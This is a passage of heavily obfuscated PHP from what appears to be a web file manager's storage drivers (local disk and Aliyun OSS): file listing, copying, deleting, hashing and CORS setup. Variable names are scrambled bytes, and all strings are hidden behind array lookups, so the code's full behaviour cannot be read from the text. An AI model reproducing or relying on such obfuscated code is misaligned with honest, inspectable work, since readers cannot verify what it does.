($ÏîÊŒ¥¶) { return array($­ä£½ş[32] => $Šø¿ŒŸË, $­ä£½ş[84] => $this->getPathOuter($…ÒÙÒÏ), $­ä£½ş[33] => $­ä£½ş[75]); } $“º©±Á = array($­ä£½ş[32] => $Šø¿ŒŸË, $­ä£½ş[84] => $this->getPathOuter($…ÒÙÒÏ), $­ä£½ş[33] => $­ä£½ş[75], $­ä£½ş[200] => @filectime($…ÒÙÒÏ), $­ä£½ş[85] => @filemtime($…ÒÙÒÏ), $­ä£½ş[1385] => @fileatime($…ÒÙÒÏ), $­ä£½ş[1386] => is_readable($…ÒÙÒÏ), $­ä£½ş[1387] => is_writable($…ÒÙÒÏ), $­ä£½ş[1388] => get_mode($…ÒÙÒÏ)); return $“º©±Á; } private function fileInfo($æˆÏ†ºÁ, $£õÀù–£ = false) { $å×Íçå =& $_SERVER[™¾ÇÙ¯¹]; $´÷şõü = $this->iconvApp($this->pathThis($æˆÏ†ºÁ)); if ($£õÀù–£) { return array($å×Íçå[32] => $´÷şõü, $å×Íçå[84] => $this->getPathOuter($æˆÏ†ºÁ), $å×Íçå[33] => $å×Íçå[199], $å×Íçå[76] => $this->size($æˆÏ†ºÁ), $å×Íçå[174] => $this->ext($´÷şõü)); } $¨ÍÂ¯Øª = array($å×Íçå[32] => $´÷şõü, $å×Íçå[84] => $this->getPathOuter($æˆÏ†ºÁ), $å×Íçå[33] => $å×Íçå[199], $å×Íçå[200] => @filectime($æˆÏ†ºÁ), $å×Íçå[85] => @filemtime($æˆÏ†ºÁ), $å×Íçå[1385] => @fileatime($æˆÏ†ºÁ), $å×Íçå[76] => $this->size($æˆÏ†ºÁ), $å×Íçå[174] => $this->ext($´÷şõü), $å×Íçå[1386] => is_readable($æˆÏ†ºÁ), $å×Íçå[1387] => is_writable($æˆÏ†ºÁ), $å×Íçå[1388] => get_mode($æˆÏ†ºÁ)); return $¨ÍÂ¯Øª; } public function exist($À¹ÈÓö) { $À¹ÈÓö = $this->iconvSystem($À¹ÈÓö); return @file_exists($À¹ÈÓö); } public function isFile($Ö²Ü¹ÂË) { $Ö²Ü¹ÂË = $this->iconvSystem($Ö²Ü¹ÂË); return @is_file($Ö²Ü¹ÂË); } public function isFolder($î´şîÉ) { $î´şîÉ = $this->iconvSystem($î´şîÉ); return @is_dir($î´şîÉ); } public function listPath($íôªŒ¥¥, $€Åº¤‹ò = false) { $×™à×„Ø =& $_SERVER[™¾ÇÙ¯¹]; $íôªŒ¥¥ = $this->iconvSystem($íôªŒ¥¥); $íôªŒ¥¥ = rtrim($íôªŒ¥¥, $×™à×„Ø[8]) . $×™à×„Ø[8]; $ˆ§ÚÙÅ¢ = array($×™à×„Ø[82] => array(), $×™à×„Ø[83] => array()); if (!($èñ­ñ = @opendir($íôªŒ¥¥))) { return $ˆ§ÚÙÅ¢; } while (($ÂÎö±Œƒ = readdir($èñ­ñ)) !== !1) { if ($ÂÎö±Œƒ == $×™à×„Ø[10] || $ÂÎö±Œƒ == $×™à×„Ø[1382]) { continue; } $áâ¦¿ø = $íôªŒ¥¥ . $ÂÎö±Œƒ; if (is_file($áâ¦¿ø)) { $ˆ§ÚÙÅ¢[$×™à×„Ø[83]][] = $this->fileInfo($áâ¦¿ø, $€Åº¤‹ò); } else { $ˆ§ÚÙÅ¢[$×™à×„Ø[82]][] = $this->folderInfo($áâ¦¿ø, $€Åº¤‹ò); } } closedir($èñ­ñ); return $ˆ§ÚÙÅ¢; } public function listAll($Ë‘üİ§Ö, &$ÉĞ±Œ§Ÿ = array()) { $²øš¡Ùœ =& $_SERVER[™¾ÇÙ¯¹]; $Ë‘üİ§Ö = $this->iconvSystem($Ë‘üİ§Ö); $Ë‘üİ§Ö = rtrim($Ë‘üİ§Ö, $²øš¡Ùœ[8]) . $²øš¡Ùœ[8]; if (!($ÈÅÒ®Ô½ = @opendir($Ë‘üİ§Ö))) { return $ÉĞ±Œ§Ÿ; } while (($§¸Ë†Èğ = readdir($ÈÅÒ®Ô½)) !== !1) { if ($§¸Ë†Èğ == $²øš¡Ùœ[10] || $§¸Ë†Èğ == $²øš¡Ùœ[1382]) { continue; } $æ²Óë‰é = $Ë‘üİ§Ö . $§¸Ë†Èğ; if (is_dir($æ²Óë‰é) && !is_link($æ²Óë‰é)) { $ÉĞ±Œ§Ÿ[] = array($²øš¡Ùœ[84] => $æ²Óë‰é . $²øš¡Ùœ[8], $²øš¡Ùœ[75] => 1, $²øš¡Ùœ[85] => @filemtime($æ²Óë‰é), $²øš¡Ùœ[76] => 0); $this->listAll($æ²Óë‰é, $ÉĞ±Œ§Ÿ); } else { $ÉĞ±Œ§Ÿ[] = array($²øš¡Ùœ[84] => $æ²Óë‰é, $²øš¡Ùœ[75] => 0, $²øš¡Ùœ[85] => @filemtime($æ²Óë‰é), $²øš¡Ùœ[76] => $this->size($æ²Óë‰é)); } } closedir($ÈÅÒ®Ô½); return $ÉĞ±Œ§Ÿ; } public function has($­ßĞ“ƒç, $œÒÁ¢Ù‹ = false, $â‹¦Ûò¢ = true) { $¤Ï°‡Ï =& $_SERVER[™¾ÇÙ¯¹]; $­ßĞ“ƒç = $this->iconvSystem($­ßĞ“ƒç); $­ßĞ“ƒç = rtrim($­ßĞ“ƒç, $¤Ï°‡Ï[8]) . $¤Ï°‡Ï[8]; if (!($æ¦Û™üÛ = @opendir($­ßĞ“ƒç))) { return !1; } $¾ ˜ú‰á = 0; $¼©¥ÌˆÄ = 0; $ç¿ì€È• = 0; while (($‘‹ÒªåŠ = readdir($æ¦Û™üÛ)) !== !1) { if ($‘‹ÒªåŠ == $¤Ï°‡Ï[10] || $‘‹ÒªåŠ == $¤Ï°‡Ï[1382]) { continue; } $„äÍÁ¹ = $­ßĞ“ƒç . $‘‹ÒªåŠ; if ($œÒÁ¢Ù‹) { $ç¿ì€È•++; if (@is_file($„äÍÁ¹)) { $¾ ˜ú‰á++; } else { $¼©¥ÌˆÄ++; } if ($ç¿ì€È• > 10000) { break; } continue; } if ($â‹¦Ûò¢) { if (@is_file($„äÍÁ¹)) { return !0; } } else { if (@is_dir($„äÍÁ¹ . $¤Ï°‡Ï[8])) { return !0; } } } closedir($æ¦Û™üÛ); if ($œÒÁ¢Ù‹) { return array($¤Ï°‡Ï[207] => $¾ ˜ú‰á, $¤Ï°‡Ï[208] => $¼©¥ÌˆÄ); } return !1; } public function hashSimple($»ËĞ¨‘Ş) { $°“¥± =& $_SERVER[™¾ÇÙ¯¹]; if (!$»ËĞ¨‘Ş) { return md5($°“¥±[12]); } $»ËĞ¨‘Ş = $this->iconvSystem($»ËĞ¨‘Ş); $›úÓ‚Œ = $this->size($»ËĞ¨‘Ş); $’àèåŞÈ = 200; $à©ï‡‰ = 50; if ($›úÓ‚Œ <= $’àèåŞÈ * $à©ï‡‰) { return $this->hashMd5($»ËĞ¨‘Ş) . $›úÓ‚Œ; } $ŞÕÖĞú = $°“¥±[12]; $™ª¢ßÌì = intval($›úÓ‚Œ / $à©ï‡‰); $…£ø€–± = fopen($»ËĞ¨‘Ş, $°“¥±[1389]); if (!$…£ø€–±) { return $ŞÕÖĞú; } for ($Çè«öğ® = 0; $Çè«öğ® < $à©ï‡‰; $Çè«öğ®++) { fseek_64($…£ø€–±, $™ª¢ßÌì * $Çè«öğ®); $ŞÕÖĞú .= fread($…£ø€–±, $’àèåŞÈ); } fseek_64($…£ø€–±, $›úÓ‚Œ - $’àèåŞÈ); $ŞÕÖĞú .= fread($…£ø€–±, $’àèåŞÈ); fclose($…£ø€–±); return md5($ŞÕÖĞú) . $›úÓ‚Œ; } public function getContent($¦ˆŸ¤ÆÑ) { $¦ˆŸ¤ÆÑ = $this->iconvSystem($¦ˆŸ¤ÆÑ); return file_get_contents($¦ˆŸ¤ÆÑ); } public function setContent($üà«ö”, $¿Â—¿Àœ = '') { $üà«ö” = $this->iconvSystem($üà«ö”); $ì ñºıÎ = @file_put_contents($üà«ö”, $¿Â—¿Àœ, LOCK_EX); clearstatcache(); @chmod($üà«ö”, $this->pathAuth); return $ì ñºıÎ === !1 ? !1 : !0; } public function fileSubstr($ÈâÀ÷Ÿ, $äğÎ¥™ü = 0, $§¬ŠÚßÀ = false) { $¼Â¥Ÿğ„ =& $_SERVER[™¾ÇÙ¯¹]; $ÈâÀ÷Ÿ = $this->iconvSystem($ÈâÀ÷Ÿ); if ($§¬ŠÚßÀ === !1) { $§¬ŠÚßÀ = $this->size($ÈâÀ÷Ÿ); } if ($§¬ŠÚßÀ <= 0) { return $¼Â¥Ÿğ„[12]; } $§»•­ù  = fopen($ÈâÀ÷Ÿ, $¼Â¥Ÿğ„[1389]); if (!$§»•­ù ) { return !1; } fseek_64($§»•­ù , $äğÎ¥™ü); $ÆçŸ†ı = fread($§»•­ù , $§¬ŠÚßÀ); fclose($§»•­ù ); return $ÆçŸ†ı; } public function upload($íñ¶âÊæ, $êÍ¨„, $ÜÄ£›ô  = false, $¼ÑšÜš = REPEAT_REPLACE) { if ($ÜÄ£›ô ) { return $this->moveFile($êÍ¨„, $íñ¶âÊæ); } return $this->copyFile($êÍ¨„, $íñ¶âÊæ); } public function setModifyTime($ŒÊ”œªë, $Œ­èÊ²Ô = '') { @touch($ŒÊ”œªë, intval($Œ­èÊ²Ô)); } public function download($İñ‰®, $Ğìä¾Ø) { return $this->iconvSystem($İñ‰®); } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($ˆ·Ù©Ğã) { parent::__construct($ˆ·Ù©Ğã); $this->signatureVersion($_SERVER[™¾ÇÙ¯¹][216]); } public function fileOutLink($¤›ÖÕ€) { $Û×³øö‚ =& $_SERVER[™¾ÇÙ¯¹]; if (substr($¤›ÖÕ€, 0, 7) == $Û×³øö‚[1333]) { $¤›ÖÕ€ = $Û×³øö‚[1334] . substr($¤›ÖÕ€, 7); } header($Û×³øö‚[161] . $¤›ÖÕ€); die; } } goto AË¬â‘âà¢; AË¬â‘âà¢: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($ÒÅŞéä˜) { parent::__construct(); include_once SDK_DIR . $_SERVER[™¾ÇÙ¯¹][1390]; $this->_init($ÒÅŞéä˜); } public function _init($‘™€õÊÊ) { $ê­´çòÁ =& $_SERVER[™¾ÇÙ¯¹]; foreach ($‘™€õÊÊ as $ó–°ØİÈ => $±ŠƒÖâ) { if (isset($this->{$ó–°ØİÈ})) { $this->{$ó–°ØİÈ} = $±ŠƒÖâ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($ê­´çòÁ[1391] . LNG($ê­´çòÁ[1392])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $¨í®Èø =& $_SERVER[™¾ÇÙ¯¹]; $Û±®Æ¹ = new OSS\Model\CorsConfig(); $Ñ©Ûİ„ = new OSS\Model\CorsRule(); $Ñ©Ûİ„->addAllowedOrigin($¨í®Èø[1393]); $Ñ©Ûİ„->addAllowedMethod($¨í®Èø[1394]); $Ñ©Ûİ„->addAllowedMethod($¨í®Èø[1395]); $Ñ©Ûİ„->addAllowedMethod($¨í®Èø[1396]); $Ñ©Ûİ„->addAllowedMethod($¨í®Èø[1397]); $Ñ©Ûİ„->addAllowedMethod($¨í®Èø[160]); $Ñ©Ûİ„->setMaxAgeSeconds(600); $Ñ©Ûİ„->addExposeHeader($¨í®Èø[1398]); $Ñ©Ûİ„->addAllowedHeader($¨í®Èø[1393]); $Û±®Æ¹->addRule($Ñ©Ûİ„); try { $this->client->putBucketCors($this->bucket, $Û±®Æ¹); } catch (OSS\Core\OssException $´àèå£¼) { return !1; } return !0; } public function getBucketCors() { $Şƒğø“Ğ =& $_SERVER[™¾ÇÙ¯¹]; $É¨€Ö“Ñ = null; try { $É¨€Ö“Ñ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $İŞÛ÷Ê±) { return null; } if (!$É¨€Ö“Ñ || !($ºÃÒ›—õ = $É¨€Ö“Ñ->getRules())) { return null; } $€¢ı¾›ı = $ºÃÒ›—õ[0]->getAllowedOrigins(); $Ñï¤¼¦ş = $ºÃÒ›—õ[0]->getAllowedMethods(); $ôÌÚŠË = $ºÃÒ›—õ[0]->getMaxAgeSeconds(); $ÌÔÉŒŸÍ = $ºÃÒ›—õ[0]->getExposeHeaders(); $Œõş¯ö˜ = $ºÃÒ›—õ[0]->getAllowedHeaders(); return array($Şƒğø“Ğ[187] => isset($€¢ı¾›ı[0]) ? $€¢ı¾›ı[0] : $Şƒğø“Ğ[12], $Şƒğø“Ğ[191] => $Ñï¤¼¦ş, $Şƒğø“Ğ[1399] => $ôÌÚŠË, $Şƒğø“Ğ[1400] => isset($ÌÔÉŒŸÍ[0]) ? $ÌÔÉŒŸÍ[0] : $Şƒğø“Ğ[12], $Şƒğø“Ğ[189] => isset($Œõş¯ö˜[0]) ? $Œõş¯ö˜[0] : $Şƒğø“Ğ[12]); } public function isBucketCors() { $™Êó„€ =& $_SERVER[™¾ÇÙ¯¹]; $ÎÁİÎß’ = $this->getBucketCors(); if (!$ÎÁİÎß’ || !is_array($ÎÁİÎß’)) { return !1; } if ($ÎÁİÎß’[$™Êó„€[187]] != $™Êó„€[188] || $ÎÁİÎß’[$™Êó„€[189]] != $™Êó„€[188]) { return !1; } $úÅÎ¸ = array_map($™Êó„€[190], $ÎÁİÎß’[$™Êó„€[191]]); if (!is_array($úÅÎ¸)) { $úÅÎ¸ = array(); } $¡¶’š¹„ = array($™Êó„€[192], $™Êó„€[193], $™Êó„€[194], $™Êó„€[195], $™Êó„€[196]); $åì¬¹ÊÑ = array_diff($¡¶’š¹„, $úÅÎ¸); return empty($åì¬¹ÊÑ); } public function mkfile($ñÛşÚõè, $ƒáõ×ˆ = '', $èĞığû = REPEAT_RENAME) { $¶ƒáüë = $this->setContent($ñÛşÚõè, $ƒáõ×ˆ); if ($¶ƒáüë !== !1) { return $this->getPathOuter($ñÛşÚõè); } return !1; } public function mkdir($¿ä÷ÃÙÃ, $óĞè‹Ş¿ = REPEAT_SKIP) { if ($óĞè‹Ş¿ && $this->_isFolder($¿ä÷ÃÙÃ)) { return $this->getPathOuter($¿ä÷ÃÙÃ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($¿ä÷ÃÙÃ)); } catch (OSS\Core\OssException $Ó£ÕùÅÖ) { return !1; } return $this->getPathOuter($¿ä÷ÃÙÃ); } private function fileList($Ø®ˆ°«, $ßôî¦æ = '', $ËÇ®¤ã = 0) { $òøú‡éá =& $_SERVER[™¾ÇÙ¯¹]; $Ø®ˆ°« = trim($Ø®ˆ°«, $òøú‡éá[8]); $©ãŸüÑé = empty($Ø®ˆ°«) && $Ø®ˆ°« !== $òøú‡éá[197] ? $òøú‡éá[12] : $Ø®ˆ°« . $òøú‡éá[8]; $Š¹½©®‡ = $òøú‡éá[12]; $éµ„øÁº = 1000; $ï¤¤€¼ç = $î¯™Ùó± = array(); while (!0) { check_abort(); $Ñİ¯¡³Ê = array($òøú‡éá[1401] => $ßôî¦æ, $òøú‡éá[1402] => $©ãŸüÑé, $òøú‡éá[1403] => $éµ„øÁº, $òøú‡éá[1404] => $Š¹½©®‡); try { $óœ¦ğ®½ = $this->client->listObjects($this->bucket, $Ñİ¯¡³Ê); } catch (OSS\Core\OssException $÷†¸–‚) { break; } $Š¹½©®‡ = $óœ¦ğ®½->getNextMarker(); $Üıç€œï = $óœ¦ğ®½->getObjectList(); $ãããÈÃÅ = $óœ¦ğ®½->getPrefixList(); foreach ($Üıç€œï as $šû¸Öí„) { if ($šû¸Öí„->getKey() == $©ãŸüÑé) { continue; } $ŒîÑ‡«µ = $šû¸Öí„->getKey(); $·ÉŞè = $šû¸Öí„->getSize(); $ÎÆ³¡ê· = $šû¸Öí„->getLastModified(); $÷««ÒëŒ = $ËÇ®¤ã ? array($òøú‡éá[32] => $ŒîÑ‡«µ, $òøú‡éá[76] => $·ÉŞè, $òøú‡éá[203] => strtotime($ÎÆ³¡ê·)) : $ŒîÑ‡«µ; $ßŸÕû¾± = $·ÉŞè == 0 && substr($ŒîÑ‡«µ, strlen($ŒîÑ‡«µ) - 1, 1) == $òøú‡éá[8] ? !0 : !1; $À¦æŠÀ¯ = array($òøú‡éá[76] => $·ÉŞè, $òøú‡éá[1405] => $·ÉŞè, $òøú‡éá[85] => strtotime($ÎÆ³¡ê·), $òøú‡éá[1406] => $ÎÆ³¡ê·); $this->cacheMethodInfoSet($ŒîÑ‡«µ, $ßŸÕû¾±, $À¦æŠÀ¯); if ($ßŸÕû¾±) { $ï¤¤€¼ç[] = $ŒîÑ‡«µ; continue; } $î¯™Ùó±[] = $÷««ÒëŒ; } foreach ($ãããÈÃÅ as $¢£¢àñà) { $ï¤¤€¼ç[] = $¢£¢àñà->getPrefix(); $this->cacheMethodInfoSet($¢£¢àñà->getPrefix(), !0); } if ($Š¹½©®‡ === $òøú‡éá[12]) { break; } } $this->cacheMethodInfoSet($Ø®ˆ°«, !0); return array($òøú‡éá[82] => $ï¤¤€¼ç, $òøú‡éá[83] => $î¯™Ùó±); } public function copyFile($‡×’Û¢, $ß—«İş) { $ÛÈÒË¸é = $this->size($‡×’Û¢); if ($ÛÈÒË¸é < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $‡×’Û¢, $this->bucket, $this->pathEncode($ß—«İş)); } catch (OSS\Core\OssException $²£¨Ñ²Ù) { return !1; } return $this->getPathOuter($ß—«İş); } $Õªù¼‚ç = $this->multiCopyObject($‡×’Û¢, $ß—«İş, $ÛÈÒË¸é); return $Õªù¼‚ç ? $this->getPathOuter($ß—«İş) : !1; } private function multiCopyObject($¥Øğİõñ, $Ã·ÅˆìÓ, $ïÒŸŞ¦ô) { $…‚€‡Ã¡ =& $_SERVER[™¾ÇÙ¯¹]; try { $­ÓÃÍ¹ = array(); if ($ÉÍã°ƒò = $this->hashMd5($¥Øğİõñ)) { $­ÓÃÍ¹ = array(OSS\OssClient::OSS_HEADERS => array($…‚€‡Ã¡[1407] => $ÉÍã°ƒò)); } $•á¥ª± = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Ã·ÅˆìÓ), $­ÓÃÍ¹); $¹“í•õ = 1; $¾Í°Óíâ = 0; $Ÿà×®ÌÏ = array(); $Ÿ™êùè = 1024 * 1024 * 10; $õà¸õ = $this->client->generateMultiuploadParts($ïÒŸŞ¦ô, $Ÿ™êùè); foreach ($õà¸õ as $ìÇ¥Á´¤ => $›ªïÖê©) { $ãûûï¢á = $¾Í°Óíâ + (int) $›ªïÖê©[$…‚€‡Ã¡[1408]]; $ÄÁö‘Ïî = (int) $›ªïÖê©[$…‚€‡Ã¡[346]] + $ãûûï¢á - 1; $ÌÂ‹ûÆ = array($…‚€‡Ã¡[1409] => $ãûûï¢á, $…‚€‡Ã¡[1410] => $ÄÁö‘Ïî); $Ÿà×®ÌÏ[] = $this->client->uploadPartCopy($this->bucket, $¥Øğİõñ, $this->bucket, $this->pathEncode($Ã·ÅˆìÓ), $¹“í•õ, $•á¥ª±, $ÌÂ‹ûÆ); $¹“í•õ = $¹“í•õ + 1; } $ÓÃã½¶• = array(); foreach ($Ÿà×®ÌÏ as $ìÇ¥Á´¤ => $–®È¦¢«) { $ÓÃã½¶•[] = array($…‚€‡Ã¡[1411] => $ìÇ¥Á´¤ + 1, $…‚€‡Ã¡[1412] => $–®È¦¢«); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($Ã·ÅˆìÓ), $•á¥ª±, $ÓÃã½¶•); } catch (OSS\Core\OssException $›¸ê³) { return !1; } return !0; } public function moveFile($öìíÁäÓ, $ÃìÉ©·) { if ($this->copyFile($öìíÁäÓ, $ÃìÉ©·)) { $this->remove($öìíÁäÓ); return $this->getPathOuter($ÃìÉ©·); } return !1; } public function delFile($ı¼î“ï) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($ı¼î“ï)); } catch (OSS\Core\OssException $¶‘­‡£”) { return !1; } return !0; } public function delFolder($ññÏ´ş) { $•û’´ñİ =& $_SERVER[™¾ÇÙ¯¹]; if (!$this->exist($ññÏ´ş)) { return !0; } $this->listItemCache = !1; $Á£â’ˆ’ = $this->fileList($ññÏ´ş); $this->listItemCache = !0; $í·®ı÷ = trim($ññÏ´ş, $•û’´ñİ[8]) . $•û’´ñİ[8]; if (!empty($ññÏ´ş) && $ññÏ´ş !== $•û’´ñİ[197] && !in_array($í·®ı÷, $Á£â’ˆ’[$•û’´ñİ[82]])) { $Á£â’ˆ’[$•û’´ñİ[82]][] = $í·®ı÷; } $Š–ÅŞ¨• = $this->delByBatch($Á£â’ˆ’[$•û’´ñİ[83]]); if (!$Š–ÅŞ¨•) { return !1; } $Š–ÅŞ¨• = $this->delByBatch($Á£â’ˆ’[$•û’´ñİ[82]]); if (!$Š–ÅŞ¨•) { return !1; } return $this->delFile($í·®ı÷); } private function delByBatch($¶°ÚÍºô) { foreach (array_chunk($¶°ÚÍºô, 1000) as $ÌÂ„üãí) { try { $this->client->deleteObjects($this->bucket, $ÌÂ„üãí); } catch (OSS\Core\OssException $©«ßËÉ‘) { return !1; } } return !0; } public function rename($àêšÎŠî, $ÖµÅÈš) { return $this->renameObject($àêšÎŠî, $ÖµÅÈš); } private function fileInfo($¥®•°Ûƒ, $ù²š¢Ó = false, $×åÑãØÊ = array()) { $ôæÂ€æ =& $_SERVER[™¾ÇÙ¯¹]; $ÍÂ„ƒ«¬ = array($ôæÂ€æ[32] => $this->pathThis($¥®•°Ûƒ), $ôæÂ€æ[84] => $this->getPathOuter($¥®•°Ûƒ), $ôæÂ€æ[33] => $ôæÂ€æ[199], $ôæÂ€æ[76] => isset($×åÑãØÊ[$ôæÂ€æ[76]]) ? $×åÑãØÊ[$ôæÂ€æ[76]] : 0, $ôæÂ€æ[174] => $this->ext($¥®•°Ûƒ)); if ($ù²š¢Ó) { return $ÍÂ„ƒ«¬; } $ÍÂ„ƒ«¬[$ôæÂ€æ[200]] = $ÍÂ„ƒ«¬[$ôæÂ€æ[85]] = 0; $ÍÂ„ƒ«¬[$ôæÂ€æ[201]] = $ÍÂ„ƒ«¬[$ôæÂ€æ[202]] = !0; if (empty($×åÑãØÊ)) { $›õË…·ï = $this->objectMeta($¥®•°Ûƒ); if (!$›õË…·ï) { return $ÍÂ„ƒ«¬; } $×åÑãØÊ = array($ôæÂ€æ[85] => strtotime($›õË…·ï[$ôæÂ€æ[1406]]), $ôæÂ€æ[76] => $›õË…·ï[$ôæÂ€æ[1405]] + 0); } if (isset($×åÑãØÊ[$ôæÂ€æ[76]])) { $ÍÂ„ƒ«¬[$ôæÂ€æ[76]] = $×åÑãØÊ[$ôæÂ€æ[76]]; } if (isset($×åÑãØÊ[$ôæÂ€æ[85]])) { $ÍÂ„ƒ«¬[$ôæÂ€æ[85]] = $×åÑãØÊ[$ôæÂ€æ[85]]; } if (isset($×åÑãØÊ[$ôæÂ€æ[203]]) && !trim($ÍÂ„ƒ«¬[$ôæÂ€æ[85]])) { $ÍÂ„ƒ«¬[$ôæÂ€æ[85]] = $×åÑãØÊ[$ôæÂ€æ[203]]; } return $ÍÂ„ƒ«¬; } private function folderInfo($İ½î€áÖ, $ùÊå–ñ = false, $Æšúğ÷ö = array()) { $™£¼×Î =& $_SERVER[™¾ÇÙ¯¹]; $Ø°ãÈ§• = array($™£¼×Î[32] => $this->pathThis($İ½î€áÖ), $™£¼×Î[84] => $this->getPathOuter($™£¼×Î[8] . $İ½î€áÖ), $™£¼×Î[33] => $™£¼×Î[75]); if ($ùÊå–ñ) { return $Ø°ãÈ§•; } $Ø°ãÈ§•[$™£¼×Î[200]] = $Ø°ãÈ§•[$™£¼×Î[85]] = 0; $Ø°ãÈ§•[$™£¼×Î[201]] = $Ø°ãÈ§•[$™£¼×Î[202]] = !0; if (empty($Æšúğ÷ö)) { $İ½î€áÖ = rtrim($İ½î€áÖ, $™£¼×Î[8]) . $™£¼×Î[8]; $«ÙÑ‚ª = $this->objectMeta($İ½î€áÖ); if (!$«ÙÑ‚ª) { return $Ø°ãÈ§•; } $Æšúğ÷ö = array($™£¼×Î[200] => $«ÙÑ‚ª[$™£¼×Î[519]][$™£¼×Î[1413]], $™£¼×Î[85] => strtotime($«ÙÑ‚ª[$™£¼×Î[1406]])); } if (isset($Æšúğ÷ö[$™£¼×Î[85]])) { $Ø°ãÈ§•[$™£¼×Î[85]] = $Æšúğ÷ö[$™£¼×Î[85]]; } if (isset($Æšúğ÷ö[$™£¼×Î[200]])) { $Ø°ãÈ§•[$™£¼×Î[200]] = $Æšúğ÷ö[$™£¼×Î[200]]; } return $Ø°ãÈ§•; } public function listPath($¸·¸›Ø„, $ø†¹ú™Ô = false) { $°´ã©½È =& $_SERVER[™¾ÇÙ¯¹]; $£§È·æ = $this->fileList($¸·¸›Ø„, $°´ã©½È[8], !0); foreach ($£§È·æ[$°´ã©½È[82]] as $öòş¦á¾ => $šé¥ãğ‹) { $£§È·æ[$°´ã©½È[82]][$öòş¦á¾] = $this->folderInfo($šé¥ãğ‹, $ø†¹ú™Ô, $šé¥ãğ‹); } foreach ($£§È·æ[$°´ã©½È[83]] as $öòş¦á¾ => $šé¥ãğ‹) { $£§È·æ[$°´ã©½È[83]][$öòş¦á¾] = $this->fileInfo($šé¥ãğ‹[$°´ã©½È[32]], $ø†¹ú™Ô, $šé¥ãğ‹); } return $£§È·æ; } protected function infoChildren($‹ñ°éÊƒ, &$ÛöíÅ°Ñ) { $üÌéæ¢÷ =& $_SERVER[™¾ÇÙ¯¹]; $¶Ï¦ƒŠ° = $this->fileList($‹ñ°éÊƒ, $üÌéæ¢÷[12], !0); $ÛöíÅ°Ñ[$üÌéæ¢÷[78]] += count($¶Ï¦ƒŠ°[$üÌéæ¢÷[82]]); $ÛöíÅ°Ñ[$üÌéæ¢÷[77]] += count($¶Ï¦ƒŠ°[$üÌéæ¢÷[83]]); foreach ($¶Ï¦ƒŠ°[$üÌéæ¢÷[83]] as $ûĞûÇÇÂ) { if (!$ûĞûÇÇÂ || !$ûĞûÇÇÂ[$üÌéæ¢÷[76]]) { continue; } $ÛöíÅ°Ñ[$üÌéæ¢÷[76]] += $ûĞûÇÇÂ[$üÌéæ¢÷[76]]; } } public function has($‹ë¼ŞÉø, $õÕ¦êÉ± = false, $ıò›ƒ = true) { $ÛÎ—±ê« =& $_SERVER[™¾ÇÙ¯¹]; $‹ë¼ŞÉø = trim($‹ë¼ŞÉø, $ÛÎ—±ê«[8]); $³¾²â = empty($‹ë¼ŞÉø) && $‹ë¼ŞÉø !== $ÛÎ—±ê«[197] ? $ÛÎ—±ê«[12] : $‹ë¼ŞÉø . $ÛÎ—±ê«[8]; $Ó‹öÀ¥ = $ÛÎ—±ê«[12]; $³å¤Û¼ = 500; $Ëß´”›Ç = $¨ÙæíÍÓ = 0; while (!0) { check_abort(); $éâ²±ÌŸ = array($ÛÎ—±ê«[1401] => $ÛÎ—±ê«[8], $ÛÎ—±ê«[1402] => $³¾²â, $ÛÎ—±ê«[1403] => $³å¤Û¼, $ÛÎ—±ê«[1404] => $Ó‹öÀ¥); try { $ÛÆŸÎ‹ = $this->client->listObjects($this->bucket, $éâ²±ÌŸ); } catch (OSS\Core\OssException $Š€¿ğ·ç) { break; } $Ó‹öÀ¥ = $ÛÆŸÎ‹->getNextMarker(); $ˆÚ¸’Œ¾ = $ÛÆŸÎ‹->getObjectList(); $Ãİ¼ç „ = $ÛÆŸÎ‹->getPrefixList(); if ($õÕ¦êÉ±) { if (count($ˆÚ¸’Œ¾) > 1 || count($ˆÚ¸’Œ¾) == 1 && $ˆÚ¸’Œ¾[0]->getKey() != $³¾²â) { $Ëß´”›Ç += count($ˆÚ¸’Œ¾) - 1; } if (!empty($Ãİ¼ç „)) { $¨ÙæíÍÓ += count($Ãİ¼ç „); } if ($Ó‹öÀ¥ === $ÛÎ—±ê«[12]) { break; } continue; } if ($ıò›ƒ) { if (!empty($ˆÚ¸’Œ¾)) { if (count($ˆÚ¸’Œ¾) > 1 || $ˆÚ¸’Œ¾[0]->getKey() != $³¾²â) { return !0; } } } else { if (!empty($Ãİ¼ç „)) { return !0; } } if ($Ó‹öÀ¥ === $ÛÎ—±ê«[12]) { break; } } if ($õÕ¦êÉ±) { return array($ÛÎ—±ê«[207] => $Ëß´”›Ç, $ÛÎ—±ê«[208] => $¨ÙæíÍÓ); } return !1; } public function listAll($Ò–°·Ãø) { $ÌåàÓ´ =& $_SERVER[™¾ÇÙ¯¹]; $åÄ–°Áï = $this->fileList($Ò–°·Ãø, $ÌåàÓ´[12], !0); $ŸàĞŞêÍ = array(); foreach ($åÄ–°Áï[$ÌåàÓ´[83]] as $µ‰§Å‚) { $ŸàĞŞêÍ[$µ‰§Å‚[$ÌåàÓ´[32]]] = $µ‰§Å‚[$ÌåàÓ´[76]]; } foreach ($åÄ–°Áï[$ÌåàÓ´[82]] as $µ‰§Å‚) { if (is_string($µ‰§Å‚)) { $ŸàĞŞêÍ[$µ‰§Å‚] = 0; } } return $this->listAllFiles($Ò–°·Ãø, array_keys($ŸàĞŞêÍ), $ŸàĞŞêÍ); } public function canRead($ŸÊ½®´„) { $Õ§ô©Ó =& $_SERVER[™¾ÇÙ¯¹]; $ŒÛÁıó = $this->pathAcl($ŸÊ½®´„); return $ŒÛÁıó == $Õ§ô©Ó[1414] || $ŒÛÁıó == $Õ§ô©Ó[564] ? !0 : !1; } public function canWrite($Ä©§Ã) { $ªö³ç•İ = $this->pathAcl($Ä©§Ã); return $ªö³ç•İ == 